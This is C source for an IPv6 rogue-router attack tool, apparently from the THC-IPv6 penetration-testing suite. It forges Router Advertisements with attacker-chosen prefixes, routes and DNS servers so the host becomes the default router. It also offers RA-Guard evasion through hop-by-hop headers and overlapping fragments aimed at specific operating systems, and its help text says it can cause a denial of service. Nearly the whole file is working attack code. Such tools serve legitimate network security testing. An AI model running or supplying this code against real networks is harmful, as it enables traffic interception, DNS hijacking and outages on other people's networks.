#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <signal.h>
#include <pcap.h>
#include "thc-ipv6.h"

#define MAX_ENTRIES 16

int plife = 99999, rlife = 4096, llife = 2048, reach = 0, trans = 0,
    dlife = 4096, cnt, to_send = 256, flags = 0, myoff = 14;
char *interface = NULL, *frbuf, *frbuf2, *frint, buf3[1232];
int   frbuflen, frbuf2len, do_overlap = 0, do_hop = 0, do_full = 0, do_frag = 0,
                         do_dst = 0, type = NXT_ICMP6, prio = 2, interval = 5,
                         do_cleanup = 0;
unsigned char *frip6, *frmac;
thc_ipv6_hdr * frhdr = NULL;

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-E type] [-A network/prefix] [-R network/prefix] [-D "
      "dns-server] [-s sourceip] [-S sourcemac] [-ardl seconds] [-Tt ms] [-n "
      "no] [-i interval] interface [target]\n\n",
      prg);
  printf("Options:\n");
  printf(" -A network/prefix  add autoconfiguration network (up to %d times)\n",
         MAX_ENTRIES);
  printf(" -a seconds         valid lifetime of prefix -A (defaults to %d)\n",
         plife);
  printf(" -R network/prefix  add a route entry (up to %d times)\n",
         MAX_ENTRIES);
  printf(" -r seconds         route entry lifetime of -R (defaults to %d)\n",
         rlife);
  printf(" -D dns-server      specify a DNS server (up to %d times)\n",
         MAX_ENTRIES);
  printf(
      " -L searchlist      specify the DNS domain search list, separate "
      "entries with ,\n");
  printf(" -d seconds         dns entry lifetime of -D (defaults to %d\n",
         dlife);
  printf(
      " -M mtu             the MTU to send, defaults to the interface "
      "setting\n");
  printf(
      " -s sourceip        the source ip of the router, defaults to your link "
      "local\n");
  printf(
      " -S sourcemac       the source mac of the router, defaults to your "
      "interface\n");
  printf(
      " -f ethernetmac     the ethernet mac address to use to send the "
      "frames\n");
  printf(" -l seconds         router lifetime (defaults to %d)\n", llife);
  printf(" -T ms              reachable timer (defaults to %d)\n", reach);
  printf(" -t ms              retrans timer (defaults to %d)\n", trans);
  printf(
      " -p priority        priority \"low\", \"medium\", \"high\" (default), "
      "\"reserved\"\n");
  printf(
      " -F flags           Set one or more of the following flags: managed, "
      "other,\n");
  printf("                    homeagent, proxy, reserved; separate by comma\n");
  printf(
      " -E type            Router Advertisement Guard Evasion option. Types: "
      "\n");
  printf("     F              full evasion (Windows and FreeBSD)\n");
  printf("     H              simple hop-by-hop header\n");
  printf(
      "     1              simple one-shot fragmentation header (can add "
      "multiple)\n");
  printf(
      "     D              insert a large destination header so that it "
      "fragments\n");
  printf(
      "     O              overlapping fragments for keep-first targets (Win, "
      "BSD, Mac)\n");
  printf(
      "     o              overlapping fragments for keep-last targets (Linux, "
      "Solaris)\n");
  printf("                    Examples: -E H111, -E D\n");  //, -E O, -E o (the
                                                            //last two are
                                                            //best)\n");
  printf(
      " -m mac-address     if only one machine should receive the RAs (not "
      "with -E DoO)\n");
  printf(" -i interval        time between RA packets (default: %d)\n",
         interval);
  printf(" -n number          number of RAs to send (default: unlimited)\n");
  printf(
      " -X                 clean up by de-announcing fake router (default: "
      "disabled)\n");
  printf(
      "\nAnnounce yourself as a router and try to become the default "
      "router.\n");
  printf(
      "If a non-existing link-local or mac address is supplied, this results "
      "in a DOS.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

void send_rs_reply(u_char *foo, const struct pcap_pkthdr *header,
                   const unsigned char *data) {
  unsigned char *pkt = NULL, *dstmac = (unsigned char *)data + 6,
                *dst = (unsigned char *)data + 14 + 8,
                *ipv6hdr = (unsigned char *)(data + 14);
  int pkt_len = 0, i;

  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_ROUTERSOL ||
      header->caplen < 14 + 40 + 2)
    return;

  if ((pkt = thc_create_ipv6_extended(frint, PREFER_LINK, &pkt_len, frip6, dst,
                                      255, 0, 0, 0xe0, 0)) == NULL)
    return;
  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, frbuf2, frbuf2len) < 0) return;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, getpid() + (cnt++ << 16)) <
          0)
        return;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff080800, frbuf,
                    frbuflen, 0) < 0)
    return;
  if (do_dst) {
    thc_generate_pkt(frint, frmac, dstmac, pkt, &pkt_len);
    frhdr = (thc_ipv6_hdr *)pkt;
    thc_send_as_fragment6(frint, frip6, dst, type, frhdr->pkt + 40 + myoff,
                          frhdr->pkt_len - 40 - myoff, 1232);
  } else {
    if (thc_generate_and_send_pkt(frint, frmac, dstmac, pkt, &pkt_len) < 0)
      return;
  }
  pkt = thc_destroy_packet(pkt);
}

void exit_cleanup(int dummy) {
  (void)(dummy);  // suppress "unused variable" message
  char *prefix = NULL;

  if (do_cleanup == 1) {
    prefix = thc_resolve6("2001:db8::");
    printf("cleaning up...\n");
    thc_routeradv6(interface, NULL, NULL, NULL, 0, 0, prefix, 0, 0, 0);
    sleep(3);
    thc_routeradv6(interface, NULL, NULL, NULL, 0, 0, prefix, 0, 0, 0);
    sleep(3);
    thc_routeradv6(interface, NULL, NULL, NULL, 0, 0, prefix, 0, 0, 0);
    if (prefix) free(prefix);
  }
  exit(0);
}

int main(int argc, char *argv[]) {
  char           mac[16] = "", dmac[16] = "", smac[16] = "";
  unsigned char *routerip6, *mac6 = NULL, *ip6 = NULL, *fmac = NULL;
  unsigned char  buf[512], *ptr, buf2[6],
      string[] = "ip6 and icmp6 and dst ff02::2";
  unsigned char rbuf[MAX_ENTRIES + 1][17], pbuf[MAX_ENTRIES + 1][17],
      *dbuf[MAX_ENTRIES + 1];
  unsigned char *dst = thc_resolve6("ff02::1");
  unsigned char *dstmac = thc_get_multicast_mac(dst);
  int size, mtu = 0, i, j, k, l, m, n, rcnt = 0, pcnt = 0, dcnt = 0, sent = 0;
  unsigned char *pkt = NULL, *searchlist = NULL;
  int            pkt_len = 0;
  pcap_t *       p;

  if (argc < 2 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  memset(rbuf, 0, sizeof(rbuf));
  memset(mac, 0, sizeof(mac));

  while ((i = getopt(argc, argv,
                     "i:r:E:R:M:m:S:s:D:L:A:a:r:d:t:T:p:n:l:F:Xf:")) >= 0) {
    switch (i) {
      case 'i':
        interval = atoi(optarg);
        break;
      case 'm':
        sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *)&dmac[0],
               (unsigned int *)&dmac[1], (unsigned int *)&dmac[2],
               (unsigned int *)&dmac[3], (unsigned int *)&dmac[4],
               (unsigned int *)&dmac[5]);
        dstmac = dmac;
        break;
      case 'S':
        sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
               (unsigned int *)&mac[1], (unsigned int *)&mac[2],
               (unsigned int *)&mac[3], (unsigned int *)&mac[4],
               (unsigned int *)&mac[5]);
        mac6 = mac;
        break;
      case 'f':
        sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *)&smac[0],
               (unsigned int *)&smac[1], (unsigned int *)&smac[2],
               (unsigned int *)&smac[3], (unsigned int *)&smac[4],
               (unsigned int *)&smac[5]);
        fmac = smac;
        break;
      case 's':
        if ((ip6 = thc_resolve6(optarg)) == NULL) {
          fprintf(stderr, "Error: can not resolve source ip address %s\n",
                  optarg);
          exit(-1);
        }
        break;
      case 'M':
        mtu = atoi(optarg);
        if (mtu < 0 || mtu > 65535) {
          fprintf(stderr, "Error: mtu argument is invalid: %s\n", optarg);
          exit(-1);
        }
        if (mtu < 1228 || mtu > 1500)
          fprintf(stderr,
                  "Warning: unusual mtu size defined, be sure what you are "
                  "doing: %d\n",
                  mtu);
        break;
      case 'n':
        to_send = atoi(optarg);
        if (to_send < 1 || to_send > 255) {
          fprintf(
              stderr,
              "Error: -n argument is invalid, must be between 1 and 255: %s\n",
              optarg);
          exit(-1);
        }
        break;
      case 'A':
        if (pcnt >= MAX_ENTRIES) {
          fprintf(
              stderr,
              "Error: you can not define more than %d autoconfig addresses\n",
              MAX_ENTRIES);
          exit(-1);
        }
        if (optarg == NULL || (ptr = index(optarg, '/')) == NULL) {
          fprintf(stderr,
                  "Error: -A option must be supplied as "
                  "IP-ADDRESS/PREFIXLENGTH, e.g. fd00::/64 : %s\n",
                  optarg);
          exit(-1);
        }
        *ptr++ = 0;
        if ((size = atoi(ptr)) < 0 &&
            size > 255) {  // yes we allow bad sizes :-)
          fprintf(
              stderr,
              "Error: -A option prefix length must be between 0 and 128: %s\n",
              optarg);
          exit(-1);
        }
        if (size != 64)
          fprintf(stderr,
                  "Warning: -A option defines an unusual prefix length: %d\n",
                  size);
        if (index(optarg, ':') == NULL) strcat(optarg, "::");
        if ((routerip6 = thc_resolve6(optarg)) == NULL) {
          fprintf(stderr, "Error: -A option network is invalid: %s\n", optarg);
          exit(-1);
        }
        pbuf[pcnt][0] = size % 256;
        memcpy((char *)&pbuf[pcnt][1], routerip6, 16);
        pcnt++;
        break;
      case 'a':
        plife = atoi(optarg);
        break;
      case 'r':
        rlife = atoi(optarg);
        break;
      case 'd':
        dlife = atoi(optarg);
        break;
      case 'l':
        llife = atoi(optarg);
        break;
      case 'T':
        reach = atoi(optarg);
        break;
      case 't':
        trans = atoi(optarg);
        break;
      case 'p':
        if (strncasecmp(optarg, "low", 3) == 0)
          prio = 0;
        else if (strncasecmp(optarg, "med", 3) == 0)
          prio = 1;
        else if (strncasecmp(optarg, "hi", 2) == 0)
          prio = 2;
        else if (strncasecmp(optarg, "res", 3) == 0)
          prio = 3;
        else {
          fprintf(stderr,
                  "Error: unknown priority, known keywords are low, medium and "
                  "high: %s\n",
                  optarg);
          exit(-1);
        }
        break;
      case 'R':
        if (rcnt >= MAX_ENTRIES) {
          fprintf(stderr, "Error: you can not define more than %d routes\n",
                  MAX_ENTRIES);
          exit(-1);
        }
        if (optarg == NULL || (ptr = index(optarg, '/')) == NULL) {
          fprintf(stderr,
                  "Error: -R option must be supplied as "
                  "IP-ADDRESS/PREFIXLENGTH, e.g. fd00::/64 : %s\n",
                  optarg);
          exit(-1);
        }
        *ptr++ = 0;
        if ((size = atoi(ptr)) < 0 &&
            size > 255) {  // yes we allow bad sizes :-)
          fprintf(
              stderr,
              "Error: -R option prefix length must be between 0 and 128: %s\n",
              optarg);
          exit(-1);
        }
        if (index(optarg, ':') == NULL) strcat(optarg, "::");
        if ((routerip6 = thc_resolve6(optarg)) == NULL) {
          fprintf(stderr, "Error: -R option network is invalid: %s\n", optarg);
          exit(-1);
        }
        rbuf[rcnt][0] = size % 256;
        memcpy((char *)&rbuf[rcnt][1], routerip6, 16);
        rcnt++;
        break;
      case 'D':
        if (dcnt >= MAX_ENTRIES) {
          fprintf(stderr,
                  "Error: you can not define more than %d DNS servers\n",
                  MAX_ENTRIES);
          exit(-1);
        }
        if ((dbuf[dcnt++] = thc_resolve6(optarg)) == NULL) {
          fprintf(stderr, "Error: can not resolve DNS server %s\n", optarg);
          exit(-1);
        }
        break;
      case 'L':
        searchlist = optarg;
        break;
      case 'E':
        if (optarg == NULL) {
          fprintf(stderr, "Error: no option type given for -E\n");
          exit(-1);
        }
        for (j = 0; j < strlen(optarg); j++) {
          switch (
              optarg[j]) {  // fall through to be fail safe on accidental misuse
            case 'F':
              do_full = 1;
              break;
            case '0':  // fall through
            case 'O':
              do_overlap = 1;
              break;
            case 'o':
              do_overlap = 2;
              break;
            case '1':  // fall through
            case 'l':  // fall through
            case 'L':
              do_frag++;
              break;
            case 'h':  // fall through
            case 'H':
              do_hop = 1;
              break;
            case 'd':  // fall through
            case 'D':
              do_dst = 1;
              break;
            default:
              fprintf(stderr, "Error: unknown evasion type %c!\n", optarg[j]);
              exit(-1);
          }
          if ((do_frag && (do_dst || do_overlap)) || (do_dst && do_overlap)) {
            fprintf(
                stderr,
                "Error: you can not use -E types 1, D, O and o together!\n");
            exit(-1);
          }
          if (do_full && (do_dst || do_overlap || do_frag)) {
            fprintf(stderr,
                    "Error: you can not use -E type F together with any other "
                    "evasion option\n");
            exit(-1);
          }
        }
        break;
      case 'F':
        ptr = strtok(optarg, ",");
        while (ptr != NULL) {
          if (strncasecmp(ptr, "man", 3) == 0)
            flags = (flags | 128);
          else if (strncasecmp(ptr, "oth", 3) == 0)
            flags = (flags | 64);
          else if (strncasecmp(ptr, "hom", 3) == 0)
            flags = (flags | 32);
          else if (strncasecmp(ptr, "prox", 4) == 0)
            flags = (flags | 4);
          else if (strncasecmp(ptr, "res", 3) == 0)
            flags = (flags | 2);
          else if (strncasecmp(ptr, "unk", 3) == 0)
            flags = (flags | 1);
          else {
            fprintf(stderr, "Error: unknown flag: %s\n", ptr);
            exit(-1);
          }
          ptr = strtok(NULL, ",");
        }
        break;
      case 'X':
        do_cleanup = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if ((argc - optind) < 1 || (argc - optind) > 2) help(argv[0]);

  if (do_hdr_size) myoff = do_hdr_size;
  interface = argv[optind];
  if (argc - optind == 2)
    if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
      fprintf(stderr, "Error: invalid target %s\n", argv[optind + 1]);
      exit(-1);
    }
  if (mtu == 0) mtu = thc_get_mtu(interface);
  if (mac6 == NULL)
    if ((mac6 = thc_get_own_mac(interface)) == NULL) {
      fprintf(stderr, "Error: invalid interface %s\n", interface);
      exit(-1);
    }
  if (fmac == NULL) fmac = mac6;
  if (ip6 == NULL)
    if ((ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK)) == NULL) {
      fprintf(stderr, "Error: IPv6 is not enabled on interface %s\n",
              interface);
      exit(-1);
    }
  //  if (dns == NULL)
  //    dns = thc_resolve6("ff02::fb");

  frint = interface;
  frip6 = ip6;
  frmac = fmac;
  frbuf = buf;
  frbuf2 = buf2;
  frbuf2len = sizeof(buf2);

  memset(buf, 0, sizeof(buf));
  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));

  if (llife > 0xffff) llife = 0xffff;
  llife = (llife | 0xff000000);
  if (prio == 2)
    llife = (llife | 0x00080000);
  else if (prio == 0)
    llife = (llife | 0x00180000);
  else if (prio != 1)
    llife = (llife | 0x00100000);

  llife = (llife | (flags << 16));

  buf[0] = reach / 16777216;
  buf[1] = (reach % 16777216) / 65536;
  buf[2] = (reach % 65536) / 256;
  buf[3] = reach % 256;
  buf[4] = trans / 16777216;
  buf[5] = (trans % 16777216) / 65536;
  buf[6] = (trans % 65536) / 256;
  buf[7] = trans % 256;

  // option mtu
  buf[8] = 5;
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  i = 16;

  // mac address option
  buf[i++] = 1;
  buf[i++] = 1;
  memcpy(buf + i, mac6, 6);
  i += 6;

  // option prefix, put all in
  if (pcnt > 0)
    for (j = 0; j < pcnt; j++) {
      buf[i++] = 3;
      buf[i++] = 4;
      buf[i++] = pbuf[j][0];  // prefix length
      buf[i++] = 128 + 64;
      buf[i++] = plife / 16777216;
      buf[i++] = (plife % 16777216) / 65536;
      buf[i++] = (plife % 65536) / 256;
      buf[i++] = plife % 256;
      buf[i++] = (plife / 2) / 16777216;
      buf[i++] = ((plife / 2) % 16777216) / 65536;
      buf[i++] = ((plife / 2) % 65536) / 256;
      buf[i++] = (plife / 2) % 256;
      i += 4;  // + 4 bytes reserved
      memcpy(&buf[i], (char *)&pbuf[j][1], 16);
      i += 16;
    }
  // route option, put all in
  if (rcnt > 0)
    for (j = 0; j < rcnt; j++) {
      buf[i++] = 0x18;        // routing entry option type
      buf[i++] = 0x03;        // length 3 == 24 bytes
      buf[i++] = rbuf[j][0];  // prefix length
      if (prio == 2)
        buf[i++] = 0x08;  // priority, highest of course
      else if (prio == 1)
        buf[i++] = 0x00;
      else if (prio == 0)
        buf[i++] = 0x18;
      else
        buf[i++] = 0x10;
      buf[i++] = rlife / 16777216;
      buf[i++] = (rlife % 16777216) / 65536;
      buf[i++] = (rlife % 65536) / 256;
      buf[i++] = rlife % 256;
      memcpy((char *)&buf[i], (char *)&rbuf[j][1], 16);  // network
      i += 16;
    }
  // dns option
  if (dcnt > 0)
    for (j = 0; j < dcnt; j++) {
      buf[i++] = 0x19;  // dns option type
      buf[i++] = 0x03;  // length
      i += 2;           // reserved
      buf[i++] = dlife / 16777216;
      buf[i++] = (dlife % 16777216) / 65536;
      buf[i++] = (dlife % 65536) / 256;
      buf[i++] = dlife % 256;
      memcpy(buf + i, dbuf[j], 16);  // dns server
      i += 16;
    }

  // dns searchlist option
  if (searchlist != NULL) {
    buf[i] = 31;
    buf[i + 4] = dlife / 16777216;
    buf[i + 5] = (dlife % 16777216) / 65536;
    buf[i + 6] = (dlife % 65536) / 256;
    buf[i + 7] = dlife % 256;
    if (searchlist[strlen(searchlist) - 1] == '.')
      searchlist[strlen(searchlist) - 1] = 0;
    m = 0;
    while ((ptr = strstr(searchlist, ".,")) != NULL) {
      m = strlen(ptr);
      for (l = 1; l < m; l++)
        ptr[l - 1] = ptr[l];
      ptr[m - 1] = 0;
    }
    l = 0;
    m = 0;
    j = strlen(searchlist);
    do {
      k = 0;
      ptr = index(&searchlist[l], '.');
      if (ptr == NULL || (index(&searchlist[l], ',') != NULL &&
                          (char *)ptr > (char *)index(&searchlist[l], ','))) {
        k = 1;
        ptr = index(&searchlist[l], ',');
      }
      if (ptr != NULL) *ptr = 0;
      n = strlen(&searchlist[l]);

      buf[i + 8 + m] = n;
      memcpy(&buf[i + 8 + m + 1], &searchlist[l], n);

      if (ptr == NULL)
        l = j;
      else
        l += 1 + n;

      m += 1 + n;

      if (k || ptr == NULL) m++;  // end of domain entry
    } while (l < j && ptr != NULL);
    if (m % 8 > 0) m = ((m / 8) + 1) * 8;
    buf[i + 1] = m / 8 + 1;
    i += m + 8;
  }

  frbuflen = i;

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                      dst, 255, 0, 0, 0xe0, 0)) == NULL)
    return -1;

  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, frbuf2, 6) < 0) return -1;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (j = 0; i < do_frag; j++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, getpid() + (cnt++ << 16)) <
          0)
        return -1;
  }

  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, llife, buf, i, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, frmac, dstmac, pkt, &pkt_len) < 0) return -1;
  frhdr = (thc_ipv6_hdr *)pkt;
  // printf("DEBUG: RA size is %d bytes, do_dst %d, do_overlap %d\n", i + 8,
  // do_dst, do_overlap);

  // init pcap
  if ((p = thc_pcap_init(interface, string)) == NULL) {
    fprintf(stderr, "Error: could not capture on interface %s with string %s\n",
            interface, string);
    exit(-1);
  }

  signal(SIGINT, exit_cleanup);
  printf("Starting to advertise router (Press Control-C to end) ...\n");
  while (sent < to_send || to_send > 255) {
    if (do_full) {
      thc_send_raguard_bypass6(interface, ip6, dst, frmac, dstmac, NXT_ICMP6,
                               frhdr->pkt + 40 + myoff,
                               frhdr->pkt_len - 40 - myoff, 0);
    } else if (do_dst) {
      thc_send_as_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff,
                            frhdr->pkt_len - 40 - myoff, 1232);
    } else if (do_overlap) {
      if (do_overlap == 1)
        thc_send_as_overlapping_first_fragment6(
            interface, ip6, dst, type, frhdr->pkt + 40 + myoff,
            frhdr->pkt_len - 40 - myoff, 1232, 0);
      else
        thc_send_as_overlapping_last_fragment6(
            interface, ip6, dst, type, frhdr->pkt + 40 + myoff,
            frhdr->pkt_len - 40 - myoff, 1232, 0);
    } else {
      thc_send_pkt(interface, pkt, &pkt_len);
    }
    while (thc_pcap_check(p, (char *)send_rs_reply, NULL) > 0)
      ;
    sent++;
    if (sent != to_send || to_send > 255) sleep(interval);
  }
  exit_cleanup(0);
  return 0;  // never reached
}
